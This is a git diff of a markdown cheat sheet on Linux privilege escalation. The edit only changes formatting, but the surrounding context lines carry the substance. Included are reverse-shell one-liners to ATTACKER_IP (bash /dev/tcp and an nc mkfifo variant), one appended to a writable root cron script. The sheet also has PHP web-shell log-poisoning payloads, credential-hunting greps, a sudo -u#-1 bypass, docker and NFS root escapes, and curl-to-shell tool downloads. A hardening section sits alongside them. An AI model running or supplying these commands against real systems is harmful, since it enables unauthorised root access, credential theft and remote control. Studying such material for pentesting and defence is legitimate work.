@@ -1,6 +1,6 @@
 # checklist-to-escalate
 
-**Author:** Julien Bongars  
+**Author:** Julien Bongars\
 **Date:** 2025-10-13 01:17:38
 **Path:** notes/escalation/linux/checklist-to-escalate.md
 
@@ -11,6 +11,7 @@
 Gather comprehensive system information to analyze with LLMs for privesc vectors.
 
 ### Complete System Dump
+
 ```bash
 #!/bin/bash
 echo "=== SYSTEM INFORMATION ==="
@@ -94,6 +95,7 @@ env
 ```
 
 ### Quick One-Liner Dump
+
 ```bash
 # Compact version for quick AI analysis
 (echo "=== SYSTEM ===" && uname -a && cat /etc/os-release) && \
@@ -105,6 +107,7 @@ env
 ```
 
 ### Focused Analysis Scripts
+
 ```bash
 # Password hunting for AI
 echo "=== PASSWORD PATTERNS ==="
@@ -131,6 +134,7 @@ find /etc -writable 2>/dev/null  # Writable /etc
 ## Automated Enumeration
 
 ### LinPEAS
+
 ```bash
 # Download and run
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
@@ -144,6 +148,7 @@ scp linpeas.sh user@target:/tmp/ && ssh user@target '/tmp/linpeas.sh'
 ```
 
 ### Other Tools
+
 ```bash
 # Linux Smart Enumeration
 wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
@@ -159,6 +164,7 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 ## Manual Enumeration
 
 ### System Information
+
 ```bash
 # Kernel version (check for exploits)
 uname -a
@@ -170,6 +176,7 @@ uname -m
 ```
 
 ### User & Group Information
+
 ```bash
 # Current user
 id
@@ -188,6 +195,7 @@ cat /etc/group
 ```
 
 ### SUID/SGID Files
+
 ```bash
 # SUID binaries (runs as owner)
 find / -perm -4000 -type f 2>/dev/null
@@ -203,6 +211,7 @@ https://gtfobins.github.io/
 ```
 
 ### Writable Files & Directories
+
 ```bash
 # World-writable files
 find / -type f -perm -002 2>/dev/null
@@ -218,6 +227,7 @@ find /etc -writable 2>/dev/null
 ```
 
 ### Processes & Services
+
 ```bash
 # Running processes
 ps aux
@@ -237,6 +247,7 @@ ps aux | grep root
 ```
 
 ### Scheduled Tasks
+
 ```bash
 # System cron jobs
 cat /etc/crontab
@@ -252,6 +263,7 @@ systemctl list-timers --all
 ```
 
 ### Capabilities
+
 ```bash
 # Binaries with capabilities
 getcap -r / 2>/dev/null
@@ -261,6 +273,7 @@ getcap -r / 2>/dev/null
 ```
 
 ### File System
+
 ```bash
 # Mounted file systems
 mount
@@ -275,6 +288,7 @@ df -h
 ```
 
 ### Password & Credential Hunting
+
 ```bash
 # Search for passwords in files
 grep -rni "password" /home /var/www /opt 2>/dev/null
@@ -298,6 +312,7 @@ find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -i "password\
 ```
 
 ### Application Source Code
+
 ```bash
 # Find web server root directories
 grep -rn "DocumentRoot" /etc 2>/dev/null
@@ -415,6 +430,7 @@ grep -r "mysql\|postgres\|mongodb" /var/www 2>/dev/null | grep -v "Binary"
 ```
 
 ### Backup & Archive Files
+
 ```bash
 # Common archive formats
 find / -type f \( -name "*.zip" -o -name "*.tar" -o -name "*.tar.gz" -o -name "*.tgz" \) 2>/dev/null
@@ -495,6 +511,7 @@ tar -xzf archive.tar.gz --wildcards "*.env" "config.*" 2>/dev/null
 ```
 
 ### Logs & Audit
+
 ```bash
 # System logs
 cat /var/log/syslog
@@ -509,6 +526,7 @@ find /var/log -type f -readable 2>/dev/null
 ```
 
 ### Docker & Containers
+
 ```bash
 # Check if in container
 ls -la /.dockerenv
@@ -522,6 +540,7 @@ groups | grep docker
 ```
 
 ### Sockets & IPC
+
 ```bash
 # Unix sockets
 find / -type s 2>/dev/null
@@ -540,6 +559,7 @@ ls -la /run/dbus/system_bus_socket
 ## Common Exploitation Techniques
 
 ### Sudo Misconfigurations
+
 ```bash
 # Check sudo version
 sudo --version
@@ -552,6 +572,7 @@ sudo -u#-1 /bin/bash
 ```
 
 ### Kernel Exploits
+
 ```bash
 # Check kernel version
 uname -r
@@ -564,6 +585,7 @@ searchsploit linux kernel $(uname -r)
 ```
 
 ### Writable Scripts in Root Cron
+
 ```bash
 # Find writable cron scripts
 ls -la /etc/cron.d/*
@@ -574,6 +596,7 @@ echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/script.sh
 ```
 
 ### Path Hijacking
+
 ```bash
 # Check PATH
 echo $PATH
@@ -588,6 +611,7 @@ export PATH=/tmp:$PATH
 ```
 
 ### LFI to RCE
+
 ```bash
 # Log poisoning
 curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
@@ -602,6 +626,7 @@ curl -A "<?php system('id'); ?>" http://target/
 ```
 
 ### Docker Escape
+
 ```bash
 # If you're in docker group
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -611,6 +636,7 @@ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt 
 ```
 
 ### NFS no_root_squash
+
 ```bash
 # On attacker machine
 mkdir /tmp/nfs
@@ -627,6 +653,7 @@ chmod +s /tmp/nfs/bash
 ## Prevention & Hardening
 
 ### User & Permission Hardening
+
 ```bash
 # Disable root SSH login
 echo "PermitRootLogin no" >> /etc/ssh/sshd_config
@@ -647,6 +674,7 @@ vi /etc/security/pwquality.conf
 ```
 
 ### File System Hardening
+
 ```bash
 # Mount /tmp with noexec
 echo "tmpfs /tmp tmpfs defaults,noexec,nosuid 0 0" >> /etc/fstab
@@ -665,6 +693,7 @@ find / -xdev -type f -perm -002 -exec chmod o-w {} \;
 ```
 
 ### Service Hardening
+
 ```bash
 # Disable unnecessary services
 systemctl list-unit-files | grep enabled
@@ -680,6 +709,7 @@ ufw allow 22/tcp
 ```
 
 ### Monitoring & Logging
+
 ```bash
 # Enable auditd
 apt install auditd
@@ -697,6 +727,7 @@ echo "Defaults!/usr/bin/sudoreplay !log_output" >> /etc/sudoers
 ```
 
 ### Application Security
+
 ```bash
 # Keep system updated
 apt update && apt upgrade -y
@@ -713,6 +744,7 @@ chown root:www-data /var/www/html/.env
 ```
 
 ### Kernel & System Hardening
+
 ```bash
 # Enable ASLR
 echo 2 > /proc/sys/kernel/randomize_va_space
@@ -735,6 +767,7 @@ sysctl -p
 ```
 
 ### Docker Security
+
 ```bash
 # Don't add users to docker group (equivalent to root)
 # Use rootless docker instead
@@ -754,6 +787,7 @@ chown root:docker /var/run/docker.sock
 ```
 
 ### Regular Audits
+
 ```bash
 # Run security audit tools
 lynis audit system
@@ -776,6 +810,7 @@ aide --check
 ## Quick Reference
 
 ### GTFOBins Commands
+
 ```bash
 # If binary has SUID
 binary -p
@@ -785,6 +820,7 @@ vim, find, nmap, perl, python, ruby, php, awk, bash, less, more, nano
 ```
 
 ### Reverse Shells
+
 ```bash
 # Bash
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
@@ -798,6 +834,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 ```
 
 ### Stabilize Shell
+
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
